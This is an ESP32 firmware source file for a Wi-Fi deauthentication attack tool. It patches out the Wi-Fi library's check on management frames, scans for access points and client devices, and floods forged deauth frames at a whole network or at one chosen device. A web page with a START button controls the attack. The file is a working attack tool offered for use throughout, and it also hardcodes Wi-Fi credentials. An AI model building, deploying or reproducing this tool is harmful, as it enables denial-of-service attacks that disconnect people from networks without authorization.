/**
 * ESP32 Deauth Tool — ESP-IDF v5.5
 */

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <stdbool.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "freertos/semphr.h"

#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "cJSON.h"

static const char *TAG = "deauth";

/*
 * Link-time override: patch out the WiFi blob's sanity check that
 * rejects deauth / disassoc management frames in esp_wifi_80211_tx().
 * The blob defines ieee80211_raw_frame_sanity_check() in libnet80211.a;
 * we provide our own so the linker resolves to ours instead.
 */
int ieee80211_raw_frame_sanity_check(int arg) { return 0; }

/* ===== Config ===== */
#define WIFI_SSID          "WIFI-2"
#define WIFI_PASS          "1234567898765"
#define AP_SSID            "ESP32-Deauth"
#define AP_PASS            "12345678"
#define WEB_PORT           80
#define DEAUTH_REASON_DEFAULT  4
#define DEAUTH_BURST_DEFAULT   10
#define DEAUTH_DELAY_MS        50
#define MAX_NETWORKS  30
#define MAX_CLIENTS   30
#define MAX_RETRY     10

/* ===== Structs ===== */
typedef struct {
    uint8_t  bssid[6];
    int8_t   rssi;
    uint8_t  channel;
    char     ssid[33];
} network_info_t;

typedef struct {
    uint8_t mac[6];
    int8_t  rssi;
    uint8_t channel;
} client_info_t;

/* ===== Globals ===== */
static EventGroupHandle_t s_wifi_event_group;
static SemaphoreHandle_t  s_scan_mutex;

static network_info_t s_networks[MAX_NETWORKS];
static client_info_t  s_clients[MAX_CLIENTS];
static int s_network_count = 0;
static int s_client_count  = 0;

static uint8_t s_target_bssid[6] = {0};
static uint8_t s_target_channel  = 8;
static char    s_target_ssid[33] = "WIFI-2";

static volatile bool s_deauth_running = false;
static volatile bool s_deauth_broadcast = true;
static volatile uint32_t s_deauth_count = 0;
static volatile uint16_t s_deauth_reason = DEAUTH_REASON_DEFAULT;
static volatile uint8_t  s_deauth_burst  = DEAUTH_BURST_DEFAULT;
static volatile uint16_t s_deauth_interval_ms = 0;

static httpd_handle_t s_server = NULL;

#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT      BIT1
static int s_retry_num = 0;

/* ===== 802.11 Deauth frame (NO RadioTap) ===== */
typedef struct __attribute__((packed)) {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  addr1[6];  /* receiver (client or broadcast) */
    uint8_t  addr2[6];  /* sender (AP) */
    uint8_t  addr3[6];  /* BSSID (AP) */
    uint16_t seq_ctrl;
    uint16_t reason_code;
} deauth_frame_t;

/* ===== Prototypes ===== */
static void wifi_init_sta(void);
static void wifi_init_ap(void);
static void scan_task(void *arg);

/* =====================================================
 *  WiFi Event Handler
 * ===================================================== */

static void event_handler(void *arg, esp_event_base_t event_base,
                          int32_t event_id, void *event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        esp_wifi_connect();
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        if (s_retry_num < MAX_RETRY) {
            esp_wifi_connect();
            s_retry_num++;
            ESP_LOGI(TAG, "Retry connect (%d/%d)", s_retry_num, MAX_RETRY);
        } else {
            xEventGroupSetBits(s_wifi_event_group, WIFI_FAIL_BIT);
        }
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
        ESP_LOGI(TAG, "Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
        s_retry_num = 0;
        xEventGroupSetBits(s_wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

/* =====================================================
 *  WiFi STA Init
 * ===================================================== */

static void wifi_init_sta(void)
{
    s_wifi_event_group = xEventGroupCreate();

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    esp_event_handler_instance_t inst_any_id, inst_got_ip;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                    &event_handler, NULL, &inst_any_id));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                    &event_handler, NULL, &inst_got_ip));

    wifi_config_t wifi_config = {
        .sta = {
            .ssid = WIFI_SSID,
            .password = WIFI_PASS,
            .threshold.authmode = WIFI_AUTH_WPA2_PSK,
        },
    };
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "Connecting to %s...", WIFI_SSID);

    EventBits_t bits = xEventGroupWaitBits(s_wifi_event_group,
            WIFI_CONNECTED_BIT | WIFI_FAIL_BIT,
            pdFALSE, pdFALSE, portMAX_DELAY);

    if (bits & WIFI_CONNECTED_BIT) {
        ESP_LOGI(TAG, "Connected to %s", WIFI_SSID);
        wifi_ap_record_t ap_info;
        if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
            memcpy(s_target_bssid, ap_info.bssid, 6);
            s_target_channel = ap_info.primary;
            ESP_LOGI(TAG, "Target: %02X:%02X:%02X:%02X:%02X:%02X ch:%d",
                     s_target_bssid[0], s_target_bssid[1], s_target_bssid[2],
                     s_target_bssid[3], s_target_bssid[4], s_target_bssid[5],
                     s_target_channel);
        }
    } else if (bits & WIFI_FAIL_BIT) {
        ESP_LOGE(TAG, "Failed to connect. Starting AP...");
        esp_wifi_stop();
        wifi_init_ap();
    }
}

static void wifi_init_ap(void)
{
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    wifi_config_t ap_config = {
        .ap = {
            .ssid = AP_SSID,
            .ssid_len = strlen(AP_SSID),
            .channel = 1,
            .password = AP_PASS,
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA2_PSK,
        },
    };

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_LOGI(TAG, "AP: %s, IP: 192.168.4.1", AP_SSID);
}

/* =====================================================
 *  Promiscuous Scan (for client discovery)
 * ===================================================== */

static void IRAM_ATTR promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (len < 24) return;

    uint8_t frame_type    = (frame[0] >> 2) & 0x03;
    uint8_t frame_subtype = (frame[0] >> 4) & 0x0F;

    /* Beacon */
    if (frame_type == 0 && frame_subtype == 8) {
        if (len < 36) return;
        uint8_t *bssid = (uint8_t *)(frame + 10);

        /* Find SSID IE */
        int pos = 24;
        while (pos + 1 < len) {
            uint8_t ie_id = frame[pos];
            uint8_t ie_len = frame[pos + 1];
            if (ie_id == 0 && ie_len > 0 && ie_len < 33 && pos + 2 + ie_len <= len) {
                char ssid[34] = {0};
                memcpy(ssid, frame + pos + 2, ie_len);

                bool found = false;
                for (int i = 0; i < s_network_count; i++) {
                    if (memcmp(s_networks[i].bssid, bssid, 6) == 0) {
                        found = true;
                        break;
                    }
                }
                if (!found && s_network_count < MAX_NETWORKS) {
                    memcpy(s_networks[s_network_count].bssid, bssid, 6);
                    s_networks[s_network_count].rssi    = pkt->rx_ctrl.rssi;
                    s_networks[s_network_count].channel = pkt->rx_ctrl.channel;
                    strncpy(s_networks[s_network_count].ssid, ssid, 32);
                    s_network_count++;
                }
                break;
            }
            pos += 2 + ie_len;
        }
    }

    /* Probe Request or Data from/to AP — learn clients */
    if (type == WIFI_PKT_MGMT && frame_subtype == 4) {
        /* Probe Request */
        uint8_t *src = (uint8_t *)(frame + 10);
        bool found = false;
        for (int i = 0; i < s_client_count; i++) {
            if (memcmp(s_clients[i].mac, src, 6) == 0) {
                s_clients[i].rssi = pkt->rx_ctrl.rssi;
                found = true;
                break;
            }
        }
        if (!found && s_client_count < MAX_CLIENTS) {
            memcpy(s_clients[s_client_count].mac, src, 6);
            s_clients[s_client_count].rssi    = pkt->rx_ctrl.rssi;
            s_clients[s_client_count].channel = pkt->rx_ctrl.channel;
            s_client_count++;
        }
    }

    /* Also catch data frames to learn associated clients */
    if (type == WIFI_PKT_DATA) {
        /* addr1=receiver, addr2=sender in data frames */
        uint8_t *addr1 = (uint8_t *)(frame + 4);
        uint8_t *addr2 = (uint8_t *)(frame + 10);

        for (int a = 0; a < 2; a++) {
            uint8_t *addr = (a == 0) ? addr1 : addr2;
            /* Skip multicast/broadcast */
            if (addr[0] & 0x01) continue;
            /* Skip AP BSSIDs we already know */
            bool is_ap = false;
            for (int i = 0; i < s_network_count; i++) {
                if (memcmp(s_networks[i].bssid, addr, 6) == 0) {
                    is_ap = true;
                    break;
                }
            }
            if (is_ap) continue;

            bool found = false;
            for (int i = 0; i < s_client_count; i++) {
                if (memcmp(s_clients[i].mac, addr, 6) == 0) {
                    s_clients[i].rssi = pkt->rx_ctrl.rssi;
                    found = true;
                    break;
                }
            }
            if (!found && s_client_count < MAX_CLIENTS) {
                memcpy(s_clients[s_client_count].mac, addr, 6);
                s_clients[s_client_count].rssi    = pkt->rx_ctrl.rssi;
                s_clients[s_client_count].channel = pkt->rx_ctrl.channel;
                s_client_count++;
            }
        }
    }
}

static void scan_task(void *arg)
{
    xSemaphoreTake(s_scan_mutex, portMAX_DELAY);

    /* Stop promiscuous first */
    esp_wifi_set_promiscuous(false);
    vTaskDelay(pdMS_TO_TICKS(100));

    s_network_count = 0;
    s_client_count  = 0;

    /* Use ESP-IDF scan API — works in STA mode */
    wifi_scan_config_t scan_cfg = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = false,
    };

    ESP_LOGI(TAG, "Starting WiFi scan...");
    esp_err_t err = esp_wifi_scan_start(&scan_cfg, true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_scan_start failed: %s", esp_err_to_name(err));
        xSemaphoreGive(s_scan_mutex);
        vTaskDelete(NULL);
        return;
    }

    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);
    if (ap_count > MAX_NETWORKS) ap_count = MAX_NETWORKS;

    wifi_ap_record_t *ap_records = calloc(ap_count, sizeof(wifi_ap_record_t));
    if (ap_records) {
        esp_wifi_scan_get_ap_records(&ap_count, ap_records);
        for (int i = 0; i < ap_count; i++) {
            memcpy(s_networks[s_network_count].bssid, ap_records[i].bssid, 6);
            s_networks[s_network_count].rssi    = ap_records[i].rssi;
            s_networks[s_network_count].channel = ap_records[i].primary;
            strncpy(s_networks[s_network_count].ssid, (char *)ap_records[i].ssid, 32);
            s_networks[s_network_count].ssid[32] = '\0';
            s_network_count++;
        }
        free(ap_records);
    }

    ESP_LOGI(TAG, "Found %d networks. Scanning clients (5s)...", s_network_count);

    /* Now scan for clients via promiscuous mode */
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);

    for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(400));
    }

    esp_wifi_set_promiscuous(false);

    ESP_LOGI(TAG, "Scan done: %d networks, %d clients", s_network_count, s_client_count);
    xSemaphoreGive(s_scan_mutex);
    vTaskDelete(NULL);
}

/* =====================================================
 *  Deauth
 * ===================================================== */

static int send_deauth(const uint8_t *ap, const uint8_t *client,
                       uint16_t reason, uint8_t channel)
{
    deauth_frame_t pkt;
    memset(&pkt, 0, sizeof(pkt));

    /* 802.11 Deauth: type=0 (mgmt), subtype=12
     * Frame Control byte 0: [Protocol(2) Type(2) Subtype(4)]
     *   = 0b00 00 1100 = 0xC0
     * Frame Control byte 1: all zeros (no flags)
     * On little-endian ESP32, store as 0x00C0 → memory [C0, 00] */
    pkt.frame_control = 0x00C0;
    pkt.duration = 0;
    memcpy(pkt.addr1, client, 6);
    memcpy(pkt.addr2, ap, 6);
    memcpy(pkt.addr3, ap, 6);
    pkt.seq_ctrl = 0;
    pkt.reason_code = reason;

    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(pkt), false);
    if (ret == ESP_OK) {
        s_deauth_count++;
        return 1;
    }
    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
    return 0;
}

static void deauth_task(void *arg)
{
    uint16_t reason = s_deauth_reason;
    uint8_t  burst  = s_deauth_burst;
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    ESP_LOGI(TAG, "Deauth started: reason=%u burst=%u ch=%d target=%02X:%02X:%02X:%02X:%02X:%02X",
             reason, burst, s_target_channel,
             s_target_bssid[0], s_target_bssid[1], s_target_bssid[2],
             s_target_bssid[3], s_target_bssid[4], s_target_bssid[5]);

    /* Enable promiscuous mode — required for management frame injection */
    esp_wifi_set_promiscuous(true);

    while (s_deauth_running) {
        if (s_deauth_broadcast) {
            for (int i = 0; i < burst && s_deauth_running; i++) {
                send_deauth(s_target_bssid, broadcast, reason, s_target_channel);
                vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
            }
        } else {
            for (int c = 0; c < s_client_count && s_deauth_running; c++) {
                for (int i = 0; i < burst && s_deauth_running; i++) {
                    send_deauth(s_target_bssid, s_clients[c].mac, reason, s_target_channel);
                    vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
                }
            }
        }
        /* Pause between cycles — device can't reconnect during this time */
        if (s_deauth_interval_ms > 0) {
            vTaskDelay(pdMS_TO_TICKS(s_deauth_interval_ms));
        }
    }

    /* Disable promiscuous mode */
    esp_wifi_set_promiscuous(false);

    ESP_LOGI(TAG, "Deauth stopped. Total: %"PRIu32, s_deauth_count);
    vTaskDelete(NULL);
}

/* =====================================================
 *  Web Server — HTML
 * ===================================================== */

static const char index_html[] =
"<!DOCTYPE html><html><head><meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>ESP32 Deauth</title>"
"<style>"
"*{margin:0;padding:0;box-sizing:border-box}"
"body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:15px}"
"h1{text-align:center;margin-bottom:15px;text-shadow:0 0 8px #0f0}"
".c{max-width:700px;margin:0 auto}"
".card{background:#111;border:1px solid #0f0;border-radius:6px;padding:15px;margin-bottom:15px}"
".card h2{border-bottom:1px solid #0f0;padding-bottom:8px;margin-bottom:10px;font-size:14px}"
"button{background:#0f0;color:#000;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-weight:bold;margin:4px;font-family:monospace}"
"button:hover{background:#0c0}"
"button.d{background:#f44}"
"button.d:hover{background:#c00}"
"select,input{background:#000;color:#0f0;border:1px solid #0f0;padding:6px 10px;border-radius:4px;margin:4px;font-family:monospace}"
"table{width:100%;border-collapse:collapse;margin-top:8px;font-size:12px}"
"th,td{padding:6px;text-align:left;border-bottom:1px solid #333}"
"th{background:#1a1a1a}"
"tr:hover{background:#1a1a1a}"
"#log{background:#000;padding:8px;border-radius:4px;height:150px;overflow-y:auto;font-size:11px}"
".st{padding:8px;margin:8px 0;border-radius:4px;background:#1a1a1a;border-left:3px solid #0f0}"
"</style></head><body><div class='c'>"
"<h1>ESP32 Deauth Tool</h1>"
"<div class='card'><h2>STATUS</h2><div class='st' id='st'>Loading...</div>"
"<button onclick='refresh()'>Refresh</button>"
"<button onclick='scan()'>Scan</button></div>"
"<div class='card'><h2>NETWORKS</h2><div id='nets'>Click Scan</div></div>"
"<div class='card'><h2>CLIENTS</h2><div id='cls'>Click Scan</div></div>"
"<div class='card'><h2>DEAUTH ATTACK</h2>"
"<div><select id='tgt'><option value='all'>All (broadcast)</option>"
"<option value='client'>Specific client</option></select>"
"<select id='csl' style='display:none'><option value=''>Select client</option></select></div>"
"<div><select id='rsn'><option value='1'>1-Unspecified</option>"
"<option value='3'>3-Deauth leaving</option>"
"<option value='4' selected>4-Inactivity</option>"
"<option value='7'>7-Class3 frame</option></select></div>"
"<div><input type='number' id='brst' value='10' min='1' max='100' style='width:60px'> packets/burst"
"<br><input type='number' id='intrv' value='0' min='0' max='10000' style='width:60px'> ms interval (0=continuous)</div>"
"<br><button class='d' onclick='start()'>START</button>"
"<button onclick='stop()'>STOP</button></div>"
"<div class='card'><h2>LOG</h2><div id='log'></div></div>"
"</div><script>"
"function L(m){var l=document.getElementById('log');"
"l.innerHTML+='<div>['+new Date().toLocaleTimeString()+'] '+m+'</div>';"
"l.scrollTop=l.scrollHeight}"
"function refresh(){fetch('/api/status').then(function(r){return r.json()}).then(function(d){"
"var h='WiFi: '+(d.wifi?'OK '+d.ssid:'AP mode')+'<br>IP: '+d.ip+'<br>Target: '+d.target_ssid+' ('+d.target_bssid+') ch:'+d.target_channel+'<br>Mode: '+d.mode+'<br>Packets: '+d.deauth_count+'<br>Clients: '+d.client_count;"
"document.getElementById('st').innerHTML=h;}).catch(function(e){L('Error: '+e)})}"
"function scan(){L('Scanning...');fetch('/api/scan').then(function(r){return r.json()}).then(function(d){"
"var h='<table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th></tr>';"
"d.networks.forEach(function(n){h+='<tr><td>'+n.ssid+'</td><td>'+n.bssid+'</td><td>'+n.channel+'</td><td>'+n.rssi+'</td></tr>'});h+='</table>';"
"document.getElementById('nets').innerHTML=h;"
"h='<table><tr><th>MAC</th><th>RSSI</th><th>Ch</th></tr>';"
"d.clients.forEach(function(c){h+='<tr><td>'+c.mac+'</td><td>'+c.rssi+'</td><td>'+c.channel+'</td></tr>'});h+='</table>';"
"document.getElementById('cls').innerHTML=h;"
"var s=document.getElementById('csl');s.innerHTML='<option value=\"\">Select</option>';"
"d.clients.forEach(function(c){s.innerHTML+='<option value=\"'+c.mac+'\">'+c.mac+'</option>'});"
"L('Found: '+d.networks.length+' networks, '+d.clients.length+' clients');})}"
"document.getElementById('tgt').onchange=function(){"
"document.getElementById('csl').style.display="
"this.value=='client'?'inline-block':'none'};"
"function start(){var t=document.getElementById('tgt').value;"
"var r=document.getElementById('rsn').value;"
"var b=document.getElementById('brst').value;"
"var iv=document.getElementById('intrv').value;"
"var u='/api/deauth?reason='+r+'&burst='+b+'&interval='+iv;"
"if(t=='client'){var c=document.getElementById('csl').value;"
"if(!c){L('Select client!');return}u+='&client='+c}"
"L('Attack: '+(t=='client'?c:'broadcast'));"
"fetch(u).then(function(r){return r.json()}).then(function(d){L(d.status)})"
"}"
"function stop(){fetch('/api/stop').then(function(r){return r.json()}).then(function(d){L(d.status)})"
"}"
"refresh();setInterval(refresh,2000);"
"</script></body></html>";

/* =====================================================
 *  Web Server — API
 * ===================================================== */

static esp_err_t handle_index(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, index_html, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t handle_status(httpd_req_t *req)
{
    char target_bssid[18];
    snprintf(target_bssid, sizeof(target_bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
             s_target_bssid[0], s_target_bssid[1], s_target_bssid[2],
             s_target_bssid[3], s_target_bssid[4], s_target_bssid[5]);

    char ip_str[16] = "192.168.4.1";
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (netif) {
        esp_netif_ip_info_t ip_info;
        if (esp_netif_get_ip_info(netif, &ip_info) == ESP_OK) {
            snprintf(ip_str, sizeof(ip_str), IPSTR, IP2STR(&ip_info.ip));
        }
    }

    cJSON *json = cJSON_CreateObject();
    cJSON_AddBoolToObject(json, "wifi", strlen(ip_str) > 0 && strcmp(ip_str, "192.168.4.1") != 0);
    cJSON_AddStringToObject(json, "ssid", s_target_ssid);
    cJSON_AddStringToObject(json, "target_bssid", target_bssid);
    cJSON_AddNumberToObject(json, "target_channel", s_target_channel);
    cJSON_AddStringToObject(json, "ip", ip_str);
    cJSON_AddStringToObject(json, "mode", s_deauth_running ? "DEAUTH" : "IDLE");
    cJSON_AddNumberToObject(json, "deauth_count", s_deauth_count);
    cJSON_AddNumberToObject(json, "client_count", s_client_count);
    cJSON_AddNumberToObject(json, "network_count", s_network_count);

    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

static esp_err_t handle_scan(httpd_req_t *req)
{
    if (xSemaphoreTake(s_scan_mutex, 0) != pdTRUE) {
        cJSON *json = cJSON_CreateObject();
        cJSON_AddStringToObject(json, "status", "scan in progress");
        char *str = cJSON_PrintUnformatted(json);
        httpd_resp_set_type(req, "application/json");
        httpd_resp_send(req, str, strlen(str));
        cJSON_free(str);
        cJSON_Delete(json);
        return ESP_OK;
    }
    xSemaphoreGive(s_scan_mutex);

    xTaskCreate(scan_task, "scan", 8192, NULL, 5, NULL);

    /* Wait up to 12 seconds for scan to finish */
    for (int i = 0; i < 120; i++) {
        if (xSemaphoreTake(s_scan_mutex, pdMS_TO_TICKS(100)) == pdTRUE) {
            xSemaphoreGive(s_scan_mutex);
            break;
        }
    }

    cJSON *json = cJSON_CreateObject();
    cJSON *nets = cJSON_AddArrayToObject(json, "networks");
    cJSON *cls  = cJSON_AddArrayToObject(json, "clients");

    for (int i = 0; i < s_network_count; i++) {
        cJSON *n = cJSON_CreateObject();
        char bssid[18];
        snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
                 s_networks[i].bssid[0], s_networks[i].bssid[1], s_networks[i].bssid[2],
                 s_networks[i].bssid[3], s_networks[i].bssid[4], s_networks[i].bssid[5]);
        cJSON_AddStringToObject(n, "ssid", s_networks[i].ssid);
        cJSON_AddStringToObject(n, "bssid", bssid);
        cJSON_AddNumberToObject(n, "channel", s_networks[i].channel);
        cJSON_AddNumberToObject(n, "rssi", s_networks[i].rssi);
        cJSON_AddItemToArray(nets, n);
    }

    for (int i = 0; i < s_client_count; i++) {
        cJSON *c = cJSON_CreateObject();
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 s_clients[i].mac[0], s_clients[i].mac[1], s_clients[i].mac[2],
                 s_clients[i].mac[3], s_clients[i].mac[4], s_clients[i].mac[5]);
        cJSON_AddStringToObject(c, "mac", mac);
        cJSON_AddNumberToObject(c, "rssi", s_clients[i].rssi);
        cJSON_AddNumberToObject(c, "channel", s_clients[i].channel);
        cJSON_AddItemToArray(cls, c);
    }

    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

static esp_err_t handle_deauth(httpd_req_t *req)
{
    char query[128] = {0};
    esp_err_t err = httpd_req_get_url_query_str(req, query, sizeof(query));
    if (err != ESP_OK) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }

    char reason_str[8] = "4";
    char burst_str[8]  = "10";
    char interval_str[8] = "0";
    char client_str[18] = {0};

    httpd_query_key_value(query, "reason", reason_str, sizeof(reason_str));
    httpd_query_key_value(query, "burst",  burst_str,  sizeof(burst_str));
    httpd_query_key_value(query, "interval", interval_str, sizeof(interval_str));
    httpd_query_key_value(query, "client", client_str, sizeof(client_str));

    uint16_t reason = atoi(reason_str);
    uint8_t  burst  = atoi(burst_str);
    uint16_t interval = atoi(interval_str);
    if (burst < 1) burst = 1;
    if (burst > 100) burst = 100;

    s_deauth_reason = reason;
    s_deauth_burst  = burst;
    s_deauth_interval_ms = interval;

    if (s_deauth_running) {
        s_deauth_running = false;
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    if (strlen(client_str) > 0) {
        uint8_t client_mac[6];
        if (sscanf(client_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &client_mac[0], &client_mac[1], &client_mac[2],
                   &client_mac[3], &client_mac[4], &client_mac[5]) != 6) {
            httpd_resp_send_500(req);
            return ESP_FAIL;
        }
        ESP_LOGI(TAG, "Deauth client %s reason=%u burst=%u", client_str, reason, burst);
        s_deauth_running = true;
        s_deauth_broadcast = false;
        /* Store the single client for the task */
        s_client_count = 1;
        memcpy(s_clients[0].mac, client_mac, 6);
        xTaskCreate(deauth_task, "deauth", 4096, NULL, 5, NULL);
    } else {
        ESP_LOGI(TAG, "Deauth broadcast reason=%u burst=%u", reason, burst);
        s_deauth_running = true;
        s_deauth_broadcast = true;
        xTaskCreate(deauth_task, "deauth", 4096, NULL, 5, NULL);
    }

    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "status", "Attack started");
    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

static esp_err_t handle_stop(httpd_req_t *req)
{
    s_deauth_running = false;
    ESP_LOGI(TAG, "Deauth stop requested");

    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "status", "Stopped");
    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

/* =====================================================
 *  Web Server Start
 * ===================================================== */

static void start_web_server(void)
{
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = WEB_PORT;
    config.max_uri_handlers = 8;

    if (httpd_start(&s_server, &config) == ESP_OK) {
        httpd_uri_t uri_index = {
            .uri = "/", .method = HTTP_GET,
            .handler = handle_index, .user_ctx = NULL
        };
        httpd_uri_t uri_status = {
            .uri = "/api/status", .method = HTTP_GET,
            .handler = handle_status, .user_ctx = NULL
        };
        httpd_uri_t uri_scan = {
            .uri = "/api/scan", .method = HTTP_GET,
            .handler = handle_scan, .user_ctx = NULL
        };
        httpd_uri_t uri_deauth = {
            .uri = "/api/deauth", .method = HTTP_GET,
            .handler = handle_deauth, .user_ctx = NULL
        };
        httpd_uri_t uri_stop = {
            .uri = "/api/stop", .method = HTTP_GET,
            .handler = handle_stop, .user_ctx = NULL
        };

        httpd_register_uri_handler(s_server, &uri_index);
        httpd_register_uri_handler(s_server, &uri_status);
        httpd_register_uri_handler(s_server, &uri_scan);
        httpd_register_uri_handler(s_server, &uri_deauth);
        httpd_register_uri_handler(s_server, &uri_stop);

        ESP_LOGI(TAG, "Web server on port %d", WEB_PORT);
    }
}

/* =====================================================
 *  Main
 * ===================================================== */

void app_main(void)
{
    ESP_LOGI(TAG, "=== ESP32 Deauth Tool ===");
    ESP_LOGI(TAG, "WiFi: %s", WIFI_SSID);

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ESP_ERROR_CHECK(nvs_flash_init());
    }

    s_scan_mutex = xSemaphoreCreateMutex();

    wifi_init_sta();
    start_web_server();

    ESP_LOGI(TAG, "Ready! Open http://<ESP_IP> in browser");
}
